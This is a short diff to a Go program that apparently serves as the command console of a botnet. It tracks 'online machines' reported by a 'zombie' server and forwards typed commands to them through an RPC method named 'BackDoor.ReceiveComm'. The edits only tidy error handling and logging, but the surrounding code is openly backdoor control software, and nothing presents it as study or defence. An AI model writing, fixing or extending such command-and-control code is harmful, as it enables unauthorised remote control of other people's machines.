@@ -10,8 +10,10 @@ import (
 )
 
 func main() {
-	go zombie.NewServer()
-	log.SetFlags(log.Llongfile)
+	err := zombie.NewServer()
+	if err != nil {
+		log.Fatal(err.Error())
+	}
 	for {
 		onlineMachine := <-zombie.OnlineMachine
 		log.Println("got the online machine ", onlineMachine)
@@ -27,7 +29,7 @@ func main() {
 			var reply []byte
 			args := new(zombie.RpcArgs)
 			args.Argu = text
-			//spew.Dump(&reply)
+
 			err = HeaderClient.Call("BackDoor.ReceiveComm", args, &reply)
 			if err != nil {
 				log.Fatal(err)
